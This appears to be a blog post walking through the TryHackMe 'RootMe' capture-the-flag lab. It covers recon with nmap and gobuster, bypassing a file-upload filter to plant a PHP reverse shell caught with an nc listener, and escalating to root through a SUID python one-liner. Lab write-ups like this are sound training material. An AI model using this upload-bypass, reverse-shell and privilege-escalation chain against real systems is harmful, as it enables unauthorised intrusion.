---
layout: post
title:  "TryHackMe.com: RootMe"
categories: write-up
author: tlabruyere
tags: [CTF, tryhackme]
---

# RootMe Machine

link: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

## Walk through

### Recon

The victim box will be referred to as 'rootme`

#### Nmap
Figure out what ports are available by scanning with `nmap`:

```bash
nmap -sC -sV -oN nmap/initial
```

Usage notes [here](_notes/nmap_recon.md)

The output revealed that `ssh` is available on port 22 and an apache server up on 80 extracted from the following:

```bash
$ cat nmap/initial 
# Nmap 7.60 scan initiated Tue Dec  1 08:01:43 2020 as: nmap -sC -sV -oN nmap/initial rootme
Nmap scan report for rootme
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  1 08:02:16 2020 -- 1 IP address (1 host up) scanned in 32.94 seconds

```

#### GoBuster

Since apache is being hosted, we need to try to find potential endpoints available for attack. Using [GoBuster](https://github.com/OJ/gobuster)

```bash
$ ~/go/bin/gobuster dir -u rootme -w /usr/share/wordlists/directory-list-2.3-medium.txt 2>&1 |tee gobuster.out
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://rootme
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/12/19 11:13:23 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 302] [--> http://rootme/uploads/]
/css                  (Status: 301) [Size: 298] [--> http://rootme/css/]    
/js                   (Status: 301) [Size: 297] [--> http://rootme/js/]     
/panel                (Status: 301) [Size: 300] [--> http://rootme/panel/] 
```

The following is the `/panel` endpoint which allows uploading 

![RootMe-Panel](/assets/tryhackme_rootme/upload_panel.png)

This `/panel` could be used to upload our web shell to gain access to the system.

### Getting a Shell

After dynamically testing the `/panel` endpoint, the site works in two stages. First, you upload your file to `/panel`. If the upload is successful, it moves the file to the `/uploads` endpoint for viewing. If we are some how able to upload a reverse shell to the `/panel` endpoint, then we can execute it in the `/uploads` endpoint. 

To identify what kind of reverse shell that the system will take, we need to analyze the upload process using [burp suite](https://portswigger.net/burp). Here we would setup burp suite to intercept traffic as we execute the upload command on the page. Review headers may allow us to get an idea as to what the system is expecting. The following image is the headers presented during upload on `panel`.

![burpsuite-Panel](/assets/tryhackme_rootme/upload_with_testfile.png)

From this image we identify that php is probably running on the backend. This indicates that maybe a php reverse shell may get us access to the system.

Will use [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to gain access, but we need to rename the extension to php5. To use, update lhost and port to what you will use for your `nc` listener, and up load the file. 

Setup nc listener:

```bash
nc -lvp 1337
```

Hit the uploaded endpoint by 

```bash
curl http://rootme/uploads/php-reverse_shell.php5
```

The user flag is located at `/var/www/user.txt`. 

```bash
cat /var/www/user.txt
THM{XXXXXXXXXXXXXXX}
```


### Privilege Escalation

Identify what programs have suid set

```bash
$ find / -user root -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

Referencing [GTFObins](https://gtfobins.github.io), we can escalate privileges by using python and running the following:

[python shell](https://gtfobins.github.io/gtfobins/python/#shell)
```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
whoami
root
```

Root flag located in `/root/root.txt`

```bash
cat /root/root.txt
THM{XXXXXXXXXXXXXXXXXXXX}
```